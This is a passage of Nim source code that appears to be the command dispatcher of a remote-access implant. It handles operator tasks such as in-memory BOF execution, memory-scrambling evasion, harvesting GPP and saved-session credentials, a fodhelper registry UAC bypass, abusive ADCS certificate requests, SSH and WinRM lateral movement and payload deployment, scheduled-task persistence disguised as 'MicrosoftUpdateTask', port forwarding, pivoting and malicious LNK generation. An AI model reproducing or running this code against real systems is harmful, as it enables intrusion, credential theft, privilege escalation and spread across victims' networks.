      except: t.sendResult(id, "", "TCP_PIVOT_START: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "TCP_PIVOT_START: not supported on Linux yet")

  of "TCP_PIVOT_STOP":
    when defined(windows):
      try:
        let port = parseJson(args){"port"}.getInt(0)
        t.sendResult(id, stopTcpPivot(port), "")
      except: t.sendResult(id, stopTcpPivot(0), "")
    else:
      t.sendResult(id, "", "TCP_PIVOT_STOP: not supported on Linux yet")

  of "BOF":
    when defined(windows):
      try:
        var coffBytes = payload
        if coffBytes.len == 0:
          let nameParts = args.strip().splitWhitespace()
          if nameParts.len > 0 and gBofStore.hasKey(nameParts[0]):
            coffBytes = gBofStore[nameParts[0]]
        if coffBytes.len == 0:
          t.sendResult(id, "", "BOF: missing COFF payload"); return
        let argBytes: seq[byte] =
          if args.len > 0: (try: cast[seq[byte]](base64.decode(args)) except: @[])
          else: @[]
        let output = bofExec(coffBytes, argBytes)
        t.sendResult(id, output, "")
      except: t.sendResult(id, "", "BOF: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "BOF: not supported on this platform")

  of "BOF_LIST":
    t.sendResult(id, "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\nSupported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).", "")

  of "MEM_FLUCTUATE":
    let parts = args.strip().splitWhitespace()
    if parts.len == 0 or parts[0].toLowerAscii() == "stop":
      stopMemFluctuate()
      t.sendResult(id, "[+] memory scrambler stopped", "")
    else:
      var intervalSec = 10
      if parts.len >= 2:
        try: intervalSec = parseInt(parts[1]) except: discard
      startMemFluctuate(intervalSec)
      t.sendResult(id, "[+] memory scrambler started (interval " & $intervalSec & "s)", "")

  of "REV2SELF":
    when defined(windows): t.sendResult(id, doTokenDrop(), "")
    else: t.sendResult(id, "", "REV2SELF: not supported on Linux")

  of "GPP_PASSWORDS":
    when defined(windows): t.sendResult(id, doGppHunt(), "")
    else: t.sendResult(id, "", "GPP_PASSWORDS: not supported on Linux")

  of "SESSION_CREDS":
    when defined(windows): t.sendResult(id, doSessionGopher(), "")
    else: t.sendResult(id, "", "SESSION_CREDS: not supported on Linux")

  of "ELEVATE":
    when defined(windows):
      try:
        let parts2 = args.strip().splitWhitespace(maxsplit = 1)
        let meth2 = if parts2.len >= 1: parts2[0].toLowerAscii() else: "fodhelper"
        let cmd2  = if parts2.len >= 2: parts2[1] else: getAppFilename()
        let regPath = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
        discard runShell("reg add \"" & regPath & "\" /ve /t REG_SZ /d \"" & cmd2 & "\" /f")
        discard runShell("reg add \"" & regPath & "\" /v \"DelegateExecute\" /t REG_SZ /d \"\" /f")
        let exe2 = if meth2 == "computerdefaults":
                     "C:\\Windows\\System32\\ComputerDefaults.exe"
                   else: "fodhelper.exe"
        let out2b = runShell("start " & exe2)
        Sleep(DWORD(2000))
        discard runShell("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f")
        t.sendResult(id, "[+] UAC bypass (" & meth2 & ") triggered: " & cmd2 & "\n" & out2b, "")
      except: t.sendResult(id, "", "elevate: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "ELEVATE: not supported on Linux")

  of "NET_USE":
    try:
      let j     = parseJson(args)
      let share = j{"share"}.getStr("")
      let user  = j{"user"}.getStr("")
      let pass  = j{"pass"}.getStr("")
      t.sendResult(id, runShell("net use \"" & share & "\" \"" & pass & "\" /user:\"" & user & "\" 2>&1"), "")
    except: t.sendResult(id, "", "net_use: " & getCurrentExceptionMsg())

  of "NET_USE_DEL":
    t.sendResult(id, runShell("net use \"" & args.strip() & "\" /delete /yes 2>&1"), "")

  of "ADCS_REQUEST":
    try:
      let j    = parseJson(args)
      let ca   = j{"ca"}.getStr("")
      let tmpl = j{"template"}.getStr("")
      let subj = j{"subject"}.getStr("CN=user")
      let san  = j{"san"}.getStr("")
      var out_path = j{"out"}.getStr("")
      let pid  = getCurrentProcessId()
      let inf  = r"C:\Users\Public\adcs_" & $pid & ".inf"
      let csr  = r"C:\Users\Public\adcs_" & $pid & ".csr"
      if out_path == "": out_path = r"C:\Users\Public\adcs_" & $pid & ".cer"
      var sanLine = ""
      if san != "": sanLine = "\r\nSAN=upn=" & san
      let infContent = "[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"" & subj & "\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate=" & tmpl & sanLine & "\r\n"
      writeFile(inf, infContent)
      let o1 = runShell("certreq -new \"" & inf & "\" \"" & csr & "\" 2>&1")
      let o2 = runShell("certreq -submit -config \"" & ca & "\" \"" & csr & "\" \"" & out_path & "\" 2>&1")
      var certB64 = ""
      try:
        let certBytes = readFile(out_path)
        certB64 = "\ncert_b64=" & encode(certBytes)
      except: discard
      try: removeFile(inf) except: discard
      try: removeFile(csr) except: discard
      t.sendResult(id, o1 & "\n" & o2 & certB64, "")
    except: t.sendResult(id, "", "adcs_request: " & getCurrentExceptionMsg())

  of "WHOAMI":
    t.sendResult(id, runShell("whoami /all"), "")

  of "IPCONFIG":
    t.sendResult(id, runShell("ipconfig /all"), "")

  of "USERNAME", "USER":
    t.sendResult(id, getEnv("USERNAME", getEnv("USER", "")), "")

  of "COMPUTERNAME":
    t.sendResult(id, getEnv("COMPUTERNAME", ""), "")

  of "SSH_EXEC":
    try:
      let j    = parseJson(args)
      let host = j{"host"}.getStr()
      let port = j{"port"}.getInt(22)
      let user = j{"user"}.getStr()
      let pass = j{"pass"}.getStr()
      let cmd2 = j{"cmd"}.getStr()
      if host == "" or user == "" or cmd2 == "":
        t.sendResult(id, "", "SSH_EXEC: {host,user,cmd} required")
      else:
        when defined(windows):
          # PowerShell SSH via Invoke-Command -HostName (Win10 1809+ OpenSSH)
          let ps = "$pw=ConvertTo-SecureString '" & pass & "' -AsPlainText -Force;" &
            "$cred=New-Object PSCredential('" & user & "',$pw);" &
            "Invoke-Command -HostName " & host & " -Port " & $port &
            " -UserName " & user & " -ScriptBlock {" & cmd2 & "} 2>&1"
          t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
            ps.replace("\"","\\\"") & "\""), "")
        else:
          # Linux: use sshpass if available, else ssh with StrictHostKeyChecking=no
          let sshCmd = "sshpass -p '" & pass.replace("'","'\\''") & "' ssh" &
            " -o StrictHostKeyChecking=no -p " & $port & " " & user & "@" & host &
            " '" & cmd2.replace("'","'\\''") & "' 2>&1"
          t.sendResult(id, runShell(sshCmd), "")
    except: t.sendResult(id, "", "SSH_EXEC: " & getCurrentExceptionMsg())

  of "PERSIST_TASK":
    when defined(windows):
      let name = if args.strip() != "": args.strip() else: "MicrosoftUpdateTask"
      let cmd2 = getAppFilename()
      t.sendResult(id, doPersist(name, cmd2, "schtask"), "")
    else:
      t.sendResult(id, "", "PERSIST_TASK: Windows only")

  of "WINRM_EXEC":
    when defined(windows):
      try:
        let j = parseJson(args)
        let target2 = j{"target"}.getStr()
        let user2   = j{"user"}.getStr()
        let pass2   = j{"pass"}.getStr()
        let cmd3    = j{"cmd"}.getStr()
        if target2 == "" or cmd3 == "":
          t.sendResult(id, "", "WINRM_EXEC: {\"target\",\"user\",\"pass\",\"cmd\"} required"); return
        let addTrust2 = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
          "try{$ip=([System.Net.Dns]::GetHostAddresses('" & target2 &
          "')|Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
          "catch{$ip='" & target2 & "'};"
        let ps2 = addTrust2 &
          "$c=New-Object PSCredential('" & user2 & "',(ConvertTo-SecureString '" & pass2 &
          "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication Negotiate" &
          " -Credential $c -ScriptBlock {try{" & cmd3 & "|Out-String -Width 256}catch{$_.Exception.Message}}"
        t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
          ps2.replace("\"", "\\\"") & "\""), "")
      except: t.sendResult(id, "", "winrm_exec: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "WINRM_EXEC: not supported on Linux")

  of "WINRM_DEPLOY":
    when defined(windows):
      try:
        let j = parseJson(args)
        let target3  = j{"target"}.getStr()
        let user3    = j{"user"}.getStr()
        let pass3    = j{"pass"}.getStr()
        let payload2 = j{"payload"}.getStr()
        if target3 == "" or payload2 == "":
          t.sendResult(id, "", "WINRM_DEPLOY: {\"target\",\"user\",\"pass\",\"payload\"} required"); return
        let addTrust3 = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
          "try{$ip=([System.Net.Dns]::GetHostAddresses('" & target3 &
          "')|Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
          "catch{$ip='" & target3 & "'};"
        let ps3 = addTrust3 &
          "$c=New-Object PSCredential('" & user3 & "',(ConvertTo-SecureString '" & pass3 &
          "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication Negotiate" &
          " -Credential $c -AsJob -ScriptBlock {" & payload2 & "} | Out-Null"
        t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
          ps3.replace("\"", "\\\"") & "\""), "")
      except: t.sendResult(id, "", "winrm_deploy: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "WINRM_DEPLOY: not supported on Linux")

  of "GETPID":
    when defined(windows):
      t.sendResult(id, $GetCurrentProcessId(), "")
    else:
      t.sendResult(id, $posixLib.getpid(), "")

  of "PORTFWD_LIST":
    t.sendResult(id, portfwdList(), "")

  of "PORTFWD_ADD":
    let (proto, lport, rhost, rport) = parsePortfwdArgs(args)
    if proto == "" or lport == "" or rhost == "" or rport == "":
      t.sendResult(id, "", "usage: [tcp|udp] <lport> <rhost> <rport>")
    else:
      t.sendResult(id, portfwdAdd(proto, lport, rhost, rport), "")

  of "PORTFWD_DEL":
    let (proto, lport) = parsePortfwdDelArgs(args)
    if lport == "":
      t.sendResult(id, "", "usage: [tcp|udp] <lport>")
    else:
      t.sendResult(id, portfwdDel(proto, lport), "")

  of "BOF_STORE_LOAD":
    let name = args.strip()
    if name == "":
      t.sendResult(id, "", "usage: BOF_STORE_LOAD <name>  (payload = base64 COFF)")
    elif payload.len == 0:
      t.sendResult(id, "", "BOF_STORE_LOAD: empty payload")
    else:
      gBofStore[name] = payload
      t.sendResult(id, "[+] BOF '" & name & "' loaded into store (" & $payload.len & " bytes)", "")

  of "BOF_STORE_LIST":
    if gBofStore.len == 0:
      t.sendResult(id, "(bof store empty)", "")
    else:
      var lines: seq[string]
      for k, v in gBofStore:
        lines.add("  " & k.alignLeft(30) & "  " & $v.len & " bytes")
      t.sendResult(id, lines.join("\n"), "")

  of "BOF_STORE_UNLOAD":
    let name = args.strip()
    if gBofStore.hasKey(name):
      gBofStore.del(name)
      t.sendResult(id, "[+] BOF '" & name & "' removed from store", "")
    else:
      t.sendResult(id, "[-] BOF '" & name & "' not in store", "")

  of "GEN_LNK":
    when defined(windows):
      try:
        let j        = parseJson(args)
        let target   = j{"target"}.getStr()
        let lnkArgs  = j{"args"}.getStr()
        let workDir  = block:
          let wd = j{"working_dir"}.getStr()
          if wd != "": wd else: splitPath(target).head
        let iconPath = block:
          let ip = j{"icon_path"}.getStr()
          if ip != "": ip else: target
        let iconIdx  = int32(j{"icon_index"}.getInt(0))
        let outFile  = j{"outfile"}.getStr()
        if target == "" or outFile == "":
          t.sendResult(id, "", "GEN_LNK: {\"target\",\"outfile\"} required"); return
        # LNK flag constants
        const
          lnkHasName         = 0x00000004'u32
          lnkHasRelPath      = 0x00000008'u32
          lnkHasWorkingDir   = 0x00000010'u32
          lnkHasArguments    = 0x00000020'u32
          lnkHasIconLocation = 0x00000040'u32
          lnkIsUnicode       = 0x00000080'u32
        var buf: seq[byte]
        # 76-byte ShellLinkHeader (all-zero init, then set fields)
        var hdr = newSeq[byte](0x4C)
        # offset 0: HeaderSize = 0x4C
        hdr[0] = 0x4C'u8
        # offset 4: CLSID {00021401-0000-0000-C000-000000000046}
        let guid: array[16, byte] = [0x01'u8, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46]
        for i, b in guid: hdr[4+i] = b
        # offset 0x14: LinkFlags
        let flags = lnkHasName or lnkHasRelPath or lnkHasArguments or lnkHasWorkingDir or
                    lnkHasIconLocation or lnkIsUnicode
        hdr[0x14] = uint8(flags and 0xFF)
        hdr[0x15] = uint8((flags shr 8) and 0xFF)
        hdr[0x16] = uint8((flags shr 16) and 0xFF)
        hdr[0x17] = uint8((flags shr 24) and 0xFF)
        # offset 0x18: FileAttributes = FILE_ATTRIBUTE_ARCHIVE (0x20)
        hdr[0x18] = 0x20'u8
        # offset 0x44: IconIndex
        let icU = cast[uint32](iconIdx)
        hdr[0x44] = uint8(icU and 0xFF); hdr[0x45] = uint8((icU shr 8) and 0xFF)
        hdr[0x46] = uint8((icU shr 16) and 0xFF); hdr[0x47] = uint8((icU shr 24) and 0xFF)
        # offset 0x48: ShowCommand = SW_SHOWNORMAL (1)
        hdr[0x48] = 0x01'u8
        buf.add(hdr)
        # StringData section
        lnkAppendUStr(buf, splitFile(target).name)  # NAME_STRING
        lnkAppendUStr(buf, ".")                      # RELATIVE_PATH
        lnkAppendUStr(buf, workDir)                  # WORKING_DIR
        lnkAppendUStr(buf, target & (if lnkArgs.len > 0: " " & lnkArgs else: ""))
        lnkAppendUStr(buf, iconPath)                 # ICON_LOCATION
        let f = open(outFile, fmWrite)
        f.write(cast[string](buf))
        f.close()
        t.sendResult(id, "[+] genlnk: " & outFile & " → " & target &
                     (if lnkArgs.len > 0: " " & lnkArgs else: "") &
                     " (" & $buf.len & " bytes)", "")
      except: t.sendResult(id, "", "GEN_LNK: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "GEN_LNK: not supported on Linux")

  of "PIPE_START":
    when defined(windows):
      t.sendResult(id, pipeServerStart(args, t.agentId), "")
    else:
      t.sendResult(id, "", "PIPE_START: not supported on Linux")

  of "PIPE_STOP":
    when defined(windows):
      t.sendResult(id, pipeServerStop(args), "")
    else:
      t.sendResult(id, "", "PIPE_STOP: not supported on Linux")

  else:
    t.sendResult(id, "", "unknown task type: " & typ)
